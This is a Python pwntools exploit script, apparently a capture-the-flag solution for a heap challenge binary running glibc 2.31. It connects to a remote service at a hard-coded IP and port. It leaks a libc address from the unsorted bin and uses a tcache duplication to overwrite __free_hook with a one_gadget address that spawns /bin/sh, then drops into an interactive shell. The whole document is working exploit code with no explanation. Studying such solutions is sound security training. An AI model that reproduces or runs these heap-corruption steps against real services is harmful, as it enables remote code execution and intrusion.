from pwn import *
from struct import pack, unpack

e = context.binary = ELF("./chall")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

def start(gdbscript="",argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([e.path] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD":libc.path})
    else:
        return process([e.path] + argv, *a, **kw, env={"LD_PRELOAD":libc.path})

#io = start("""b main;continue""")
io = remote("20.55.48.101", 1339)

# Nice way to make sure we are back to the main menu
prompt = b"5. Exit\n"

def action(mode, answers):
    io.sendlineafter(prompt, str(mode).encode())
    io.recvuntil(b"\n")
    [io.sendline(answer) for answer in answers]

# 1-index

action(10, [b"big"]) #M1
action(10, [b"buck"]) #M2
action(10, [b"bunny"]) #M3
action(2, [b"2"])

# unsorted bin libc leak
action(4, [b"2"])
leak = int.from_bytes(io.recvuntil(b"\n")[:-1], byteorder="little")
leak_offset = 0x1ebbe0
libc.address = leak - leak_offset
action(10, [b"hckk"]) #M4

print("[1] Libc address:", hex(libc.address))

# tcache dup to access __free_hook
action(1, [b"Hello"]) #m5
action(1, [b"Hello2"]) #m6
action(2, [b"5"])
action(2, [b"6"])

action(3, [b"6", p64(libc.sym["__free_hook"]), ])

action(1, [b"fill"]) #m7


# From the output of one_gadget
"""
0x10a737 posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
  [r9] == NULL || r9 == NULL || r9 is a valid envp
  rdx == NULL || (s32)[rdx+0x4] <= 0
"""

gadget = libc.address + 0x10a737
print("Gadget address:", hex(gadget))
action(1, [p64(gadget)]) #m8
print("[2] Hook now points to gadget")

print("[3] ret2libc")

# trigger the hook
#action(4, [b"7"]) # view doesn't change the exploit
#action(2, [b"7"])

io.interactive()

